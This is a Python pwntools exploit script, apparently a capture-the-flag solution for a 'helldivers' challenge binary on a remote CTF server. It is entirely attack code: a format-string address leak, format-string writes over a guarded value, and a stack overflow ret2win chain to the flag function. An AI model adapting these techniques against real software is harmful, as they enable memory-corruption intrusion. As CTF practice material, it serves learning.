#!/usr/bin/env python3
from pwn import *


elf = context.binary = ELF("/home/user/Desktop/sh2024/helldivers/helldivers")
rop = ROP(elf)
context.log_level = "CRITICAL"

# p = process("/home/user/Desktop/sh2024/helldivers/helldivers")
p = remote("helldivers.martiansonly.net", 6666)

gdbscript = """
b *main+48
c
"""
# gdb.attach(p, gdbscript=gdbscript)

# LEAK ADDRSSES
payload = b""
payload += b"%p|" * 30
payload += b"Summit"

print(p.recvuntil(b">>>").decode(errors="ignore"))
p.sendline(payload)

resp = p.recvuntil(b"Summit").decode(errors="ignore")
print(f"RESP: {resp}")
ret_ptr = int(resp.split("|")[20], 16)
rbp_leak = int(resp.split("|")[21], 16)
base_leak = int(resp.split("|")[28], 16)

base_addr = base_leak - 0x125C
print(f"BASE ADDR: {hex(base_addr)}")

win_addr = base_addr + elf.sym["superearthflag"]
print(f"WIN ADDR: {hex(win_addr)}")

ret = base_addr + rop.find_gadget(["ret"]).address
print(f"RET ADDR: {hex(ret)}")

heap_addr = ret_ptr - 0x2C0 + 0x10

print(f"HEAP ADDR: {hex(heap_addr)}")

# OVERWRITE CANARY
print(p.recvuntil(b">>>").decode(errors="ignore"))
p.sendline("⬇ ⬆ ⬇ ⬆".encode(encoding="utf-8"))

p.sendafter(b"Democracy Officer today?", p64(0x1337))
p.sendafter(b"credentials:", p64(ret))

payload = fmtstr_payload(6, {heap_addr: ret & 0xFFFF}, write_size="short")
print(hexdump(payload))
p.sendlineafter(b">>>", payload)

payload = fmtstr_payload(6, {heap_addr + 2: ret >> 16 & 0xFFFF}, write_size="short")
print(hexdump(payload))
p.sendlineafter(b">>>", payload)

payload = fmtstr_payload(6, {heap_addr + 4: ret >> 32}, write_size="short")
print(hexdump(payload))
p.sendlineafter(b">>>", payload)

# RET2WIN (+ 'ret' ROP for stack alignment)
p.sendlineafter(b">>>", b"Quit")

payload = b"A" * 120
payload += p64(ret_ptr)
payload += p64(rbp_leak)
payload += p64(base_addr + elf.sym["main"] + 34)
payload += b"B" * 8
payload += p64(heap_addr)
payload += p64(0xDEADBEEF)
payload += p64(ret)
payload += p64(win_addr)

p.sendlineafter(b">>>", payload)

p.interactive()
